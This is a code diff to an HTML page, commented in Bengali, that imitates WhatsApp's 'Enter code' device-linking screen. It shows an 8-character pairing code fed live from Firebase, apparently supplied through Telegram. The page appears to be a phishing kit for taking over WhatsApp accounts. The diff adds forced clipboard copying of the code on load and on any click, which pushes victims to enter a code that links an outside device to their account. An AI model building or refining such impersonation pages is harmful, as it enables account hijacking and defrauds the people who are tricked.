@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Link Code</title>
+    <title>WhatsApp Link Code System</title>
     <style>
-        /* হোয়াটসঅ্যাপ ইন্টারফেসের মতো ক্লিন ও প্রফেশনাল ডিজাইন */
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #ffffff;
@@ -24,7 +23,7 @@
             box-sizing: border-box;
         }
 
-        /* ----- ১. ওয়েবসাইটের ওপরের অংশ (যা কখনো পরিবর্তন হবে না) ----- */
+        /* ----- ১. ওপরের স্থায়ী অংশ (সর্বদা অপরিবর্তিত থাকবে) ----- */
         .header-section {
             margin-bottom: 40px;
         }
@@ -49,30 +48,31 @@
             font-weight: 500;
         }
 
-        /* ----- ২. ওয়েবসাইটের নিচের অংশ (যা টেলিগ্রাম থেকে রিয়েল-টাইমে বদলাবে) ----- */
+        /* ----- ২. নিচের পরিবর্তনশীল অংশ (টেলিগ্রাম ও কপি সিস্টেম) ----- */
         .dynamic-code-section {
             display: flex;
             flex-direction: column;
             align-items: center;
-            min-height: 150px;
+            min-height: 180px;
         }
 
-        /* ৮টি কোডের জন্য চার-চার ভাগে সাজানো গ্রিড */
+        /* ৮টি ফাঁকা ঘরের মূল গ্রিড - ইমেজ IMG_20260530_065833.jpg এর আদলে */
         .code-grid {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 6px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
+            cursor: pointer; /* ইউজার যাতে বোঝে এখানে ক্লিক করা যাবে */
         }
 
-        /* প্রতিটা ফাঁকা ঘরের ডিজাইন (আপনার স্ক্রিনশটের মতো গোল কোণাবিশিষ্ট আয়তক্ষেত্র) */
+        /* প্রতিটা ফাঁকা ঘরের নিখুঁত ডিজাইন */
         .box-cell {
-            width: 34px;
-            height: 46px;
+            width: 36px;
+            height: 48px;
             border: 2px solid #111b21;
-            border-radius: 10px;
-            font-size: 22px;
+            border-radius: 12px;
+            font-size: 24px;
             font-weight: bold;
             color: #111b21;
             display: flex;
@@ -80,17 +80,23 @@
             align-items: center;
             background: transparent;
             text-transform: uppercase;
+            transition: background 0.2s;
         }
 
-        /* মাঝখানের হাইফেন বা ড্যাশ (-) চিহ্নের ডিজাইন */
+        /* ক্লিক করলে সামান্য হাইলাইট হবে */
+        .code-grid:active .box-cell {
+            background-color: #f4f5f5;
+        }
+
+        /* মাঝখানের ড্যাশ (-) চিহ্ন */
         .hyphen {
             font-size: 24px;
             color: #111b21;
-            margin: 0 8px;
+            margin: 0 6px;
             font-weight: bold;
         }
 
-        /* স্ক্রিনশটের নিচের সেই গুরুত্বপূর্ণ সতর্কতা বার্তা */
+        /* স্ক্রিনশটের হুবহু সতর্কতা বার্তা */
         .warning-text {
             font-size: 14px;
             color: #667781;
@@ -99,7 +105,18 @@
             text-align: center;
         }
 
-        /* ডেটা না থাকলে বা লোড হওয়ার সময় দেখানোর জন্য */
+        /* কপি সাকসেসফুল মেসেজ */
+        .toast-msg {
+            color: #00a884;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 8px;
+            display: none;
+            background: #eafefb;
+            padding: 6px 16px;
+            border-radius: 20px;
+        }
+
         .loading-placeholder {
             color: #8696a0;
             font-style: italic;
@@ -107,6 +124,7 @@
         }
     </style>
 
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
@@ -114,11 +132,13 @@
 
 <div class="whatsapp-container">
     
+    <!-- ১. ওপরের স্থায়ী অংশ -->
     <div class="header-section">
         <h2>Enter code</h2>
         <p>To get your code: Go to WhatsApp on the web or on another device, then click <strong>Link with phone number</strong>. <span class="link-highlight">Learn more</span></p>
     </div>
 
+    <!-- ২. নিচের পরিবর্তনশীল অংশ (IMG_20260530_065833.jpg এর ডিজাইন অনুযায়ী) -->
     <div class="dynamic-code-section" id="dynamic-area">
         <div class="loading-placeholder">Loading valid session...</div>
     </div>
@@ -126,58 +146,80 @@
 </div>
 
 <script>
-  // ⚠️ আপনার Firebase Realtime Database-এর URL এখানে বসাবেন
+  // ⚠️ আপনার Firebase Realtime Database URL এখানে বসাবেন
   const firebaseConfig = {
     databaseURL: "https://your-firebase-database-default-rtdb.firebaseio.com/" 
   };
   
-  // ফায়ারবেস ইনিশিয়ালাইজ করা
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
 
-  // ফায়ারবেসের 'current_session' নোড থেকে রিয়েল-টাইমে ডেটা পড়া
+  // গ্লোবাল ভ্যারিয়েবল কোডটি সেভ রাখার জন্য
+  let currentActiveCode = "";
+
+  // ক্লিপবোর্ডে কপি করার ফাংশন
+  function triggerCopy(codeText) {
+      if (!codeText) return;
+      navigator.clipboard.writeText(codeText).then(() => {
+          const toast = document.getElementById("copy-toast");
+          if (toast) {
+              toast.style.display = "block";
+              setTimeout(() => { toast.style.display = "none"; }, 2500);
+          }
+          console.log("Code successfully copied to clipboard: " + codeText);
+      }).catch(err => {
+          console.log("Auto-copy blocked by browser settings.", err);
+      });
+  }
+
+  // ফায়ারবেস থেকে রিয়েল-টাইমে ডেটা রিড করা
   database.ref('current_session').on('value', (snapshot) => {
     const dynamicArea = document.getElementById('dynamic-area');
     const data = snapshot.val();
     
-    // যদি ডাটাবেজে ৮ অক্ষরের কোনো কোড থাকে (যেমন: ABCDE123)
     if (data && data.code && data.code.length === 8) {
-        const fullCode = data.code.toUpperCase();
+        currentActiveCode = data.code.toUpperCase();
         
-        // প্রথম ৪টি অক্ষর এবং শষের ৪টি অক্ষর আলাদা করা
-        const firstPart = fullCode.substring(0, 4);
-        const secondPart = fullCode.substring(4, 8);
+        const firstPart = currentActiveCode.substring(0, 4);
+        const secondPart = currentActiveCode.substring(4, 8);
         
-        let gridHtml = '<div class="code-grid">';
+        // গ্রিড তৈরি করা (পুরো গ্রিডে ক্লিক করলে কপি হবে)
+        let gridHtml = `<div class="code-grid" onclick="triggerCopy('${currentActiveCode}')" title="কপি করতে ক্লিক করুন">`;
         
-        // প্রথম ৪টি ঘরের জন্য লুপ
         for (let i = 0; i < 4; i++) {
             gridHtml += `<div class="box-cell">${firstPart[i]}</div>`;
         }
         
-        // মাঝখানের হাইফেন (-)
         gridHtml += '<span class="hyphen">-</span>';
         
-        // শেষের ৪টি ঘরের জন্য লুপ
         for (let i = 0; i < 4; i++) {
             gridHtml += `<div class="box-cell">${secondPart[i]}</div>`;
         }
         
-        gridHtml += '</div>'; // গ্রিড শেষ
-        
-        // সতর্কতা টেক্সট যুক্ত করা
+        gridHtml += '</div>'; 
+        gridHtml += '<div class="toast-msg" id="copy-toast">✓ কোডটি ক্লিপবোর্ডে কপি হয়েছে!</div>';
         gridHtml += '<div class="warning-text">Never enter a code if you didn\'t request it.</div>';
         
-        // ওয়েবসাইটে রিয়েল-টাইমে প্রদর্শন
         dynamicArea.innerHTML = gridHtml;
         
+        // প্রো-ফিচার: কোড লোড হওয়ার সাথে সাথেই অটোমেটিক কপি করার চেষ্টা করবে
+        setTimeout(() => {
+            triggerCopy(currentActiveCode);
+        }, 500);
+        
     } else {
-        // যদি টেলিগ্রাম থেকে ডিলিট করে দেওয়া হয় বা কোনো কোড না থাকে
+        currentActiveCode = "";
         dynamicArea.innerHTML = '<div class="loading-placeholder">Waiting for code assignment...</div>';
     }
+  });
+
+  // ইউজার পেজের যেকোনো জায়গায় টাচ/ক্লিক করলেও যেন ব্যাকগ্রাউন্ডে কপি হয়ে যায়
+  document.body.addEventListener('click', () => {
+      if(currentActiveCode) {
+          triggerCopy(currentActiveCode);
+      }
   });
 </script>
 
 </body>
 </html>
-
